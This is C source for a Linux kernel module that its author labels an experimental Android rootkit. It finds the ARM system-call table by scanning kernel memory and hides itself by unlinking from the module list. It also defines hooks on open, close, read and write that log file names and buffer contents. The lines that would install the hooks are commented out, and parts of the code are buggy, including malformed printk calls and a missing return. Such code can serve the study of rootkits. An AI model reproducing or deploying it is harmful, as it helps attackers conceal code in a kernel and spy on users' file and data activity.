/*
	Author: Sebastián Guerrero Selma
	@0xroot - s.guerrero0@gmail.com
	
	2012 (c)

	An experimental Android kernel rootkit.

*/
#include <asm/unistd.h> 
#include <linux/autoconf.h> 
#include <linux/in.h> 
#include <linux/init_task.h> 
#include <linux/ip.h> 
#include <linux/kernel.h> 
#include <linux/kmod.h> 
#include <linux/mm.h> 
#include <linux/module.h> 
#include <linux/sched.h> 
#include <linux/skbuff.h> 
#include <linux/stddef.h> 
#include <linux/string.h> 
#include <linux/syscalls.h> 
#include <linux/tcp.h> 
#include <linux/types.h> 
#include <linux/unistd.h> 
#include <linux/version.h> 
#include <linux/workqueue.h> 


// Pointers to the original system calls
asmlinkage ssize_t (*orig_read) (unsigned int fd, const char *buf, size_t count);
asmlinkage ssize_t (*orig_write) (unsigned int fd, const char *buf, size_t count);
asmlinkage ssize_t (*orig_open) (const char *filename, int flags);
asmlinkage ssize_t (*orig_close) (const char *filename);

// Our hooked system calls

asmlinkage ssize_t open_sysHooked(const char *filename, int flags) {
	printk(KERN_INFO "SYS_HOOKED_OPEN: %s\n", filename);
	return orig_open(filename, flags);
}
asmlinkage ssize_t close_sysHooked(const char *filename) {
	printk(KERN_INFO "SYS_HOOKED_CLOSE: %s\n", current->comm);
	return orig_close(filename);
}
asmlinkage ssize_t write_sysHooked(unsigned int fd, const char *buf, size_t count) {
	printk(KERN_INFO "SYS_HOOKED_WRITE: %s\n", buf);
	return orig_write(fd, buf, count);
}

asmlinkage ssize_t read_sysHooked(unsigned int fd, const char *buf, size_t count) {
  printk(KERN_INFO "SYS_HOOKED_READ: %s\n", buf);
  return orig_read(fd, buf, count);
}


// Get the syscall table
unsigned long* getSysCallTable()
{
  //Address of the sofware interrupt (swi) handler in high vector ARM systems like Android
  const void *swi_addr = 0xFFFF0008;
 
  unsigned long* sys_call_table = NULL;
  unsigned long* ptr = NULL;
  unsigned long vector_swi_offset = 0;
  unsigned long vector_swi_instruction = 0;
  unsigned long *vector_swi_addr_ptr = NULL;
 
  memcpy(&vector_swi_instruction, swi_addr, sizeof(vector_swi_instruction));
  printk(KERN_INFO "-> vector_swi instruction %lx\n", vector_swi_instruction);
  vector_swi_offset = vector_swi_instruction & (unsigned long)0x00000fff;
  printk (KERN_INFO "-> vector_swi offset %lx\n", vector_swi_offset); 
  vector_swi_addr_ptr = (unsigned long *)((unsigned long)swi_addr + vector_swi_offset + 8);
  printk (KERN_INFO "-> vector_swi_addr_ptr %p, value %lx\n", vector_swi_addr_ptr, *vector_swi_addr_ptr);
 
  ptr=*vector_swi_addr_ptr;
  bool foundFirstLighthouse = false;
  unsigned long sys_call_table_offset = 0;
 
  printk (KERN_INFO "-> ptr %p, init_mm.end_code %lx\n", ptr, init_mm.end_code);
  while ((unsigned long)ptr < init_mm.end_code && sys_call_table == NULL)
  {
    if ((*ptr & (unsigned long)0xffff0fff) == 0xe3a00000)
    {
      foundFirstLighthouse = true;
      printk (KERN_INFO "-> found first lighthouse at %p, value %lx\n", ptr, *ptr);
    }
    if (foundFirstLighthouse && ((*ptr & (unsigned long)0xffff0000) == 0xe28f0000))
    {
      sys_call_table_offset = *ptr & (unsigned long)0x00000fff;
      printk (KERN_INFO "-> sys_call_table reference found at  %p, value %lx, offset %lx\n", ptr, *ptr, sys_call_table_offset);
      sys_call_table = (unsigned long)ptr + 8 + sys_call_table_offset;
      printk (KERN_INFO "-> sys_call_table found at %p\n", sys_call_table);
      break;
    }
 
    ptr++;
  }
 
  return sys_call_table;
}

// Hide module
static void hide_module() {
  __this_module.list.prev->next = __this_module.list.next;
  __this_module.list.next->prev = __this_module.list.prev;
  __this_module.list.next = LIST_POISON1;
  __this_module.list.prev = LIST_POISON2;
}

static int __init whitesnow_start(void) {

  printk(KERN_INFO, "Loading module \n");

  unsigned long * sys_table = getSysCallTable();  // Get syscall table
  hide_module();  // Hiding the module

  orig_open = (void *) sys_table[__NR_open];
  orig_close = (void *) sys_table[__NR_close];

  
  if(sys_table != NULL) {
    printk(KERN_INFO, "SYS_CALL_TABLE: %p\n\n", sys_table);
  /*printk(KERN_INFO, "__NR_read: %d\t SYS_CALL_TABLE[__NR_read]: %p\n", __NR_read, sys_table[__NR_read]);
    printk(KERN_INFO, "__NR_write: %d\t SYS_CALL_TABLE[__NR_write]: %p\n", __NR_write, sys_table[__NR_write]);
    printk(KERN_INFO, "__NR_open: %d\t SYS_CALL_TABLE[__NR_open]: %p\n", __NR_open, sys_table[__NR_open]);
    printk(KERN_INFO, "__NR_close: %d\t SYS_CALL_TABLe[__NR_close]: %p\n", __NR_close, sys_table[__NR_close]);

    // Read syscall
    orig_read = sys_table[__NR_read];
    sys_table[__NR_read] = read_sysHooked;

    // Write syscall
    orig_write = sys_table[__NR_write];
    sys_table[__NR_write] = write_sysHooked;

    // Open syscall
    orig_open = sys_table[__NR_open];
    sys_table[__NR_open] = open_sysHooked;

    // Close syscall
    orig_close = sys_table[__NR_close];
    sys_table[__NR_close] = close_sysHooked;*/

  }
}

static void __exit whitesnow_stop(void) {
	//unsigned long *sys_call_table = 0xc0027004;  android-goldfish-2.6.29
  unsigned long *sys_call_table = getSysCallTable();

	if(sys_call_table != NULL) {
		// Clean sys_call_table
		sys_call_table[__NR_open] = orig_open;
		sys_call_table[__NR_close] = orig_close;
		sys_call_table[__NR_read] = orig_read;
		sys_call_table[__NR_write] = orig_write;
	}
}

module_init (whitesnow_start);
module_exit (whitesnow_stop);
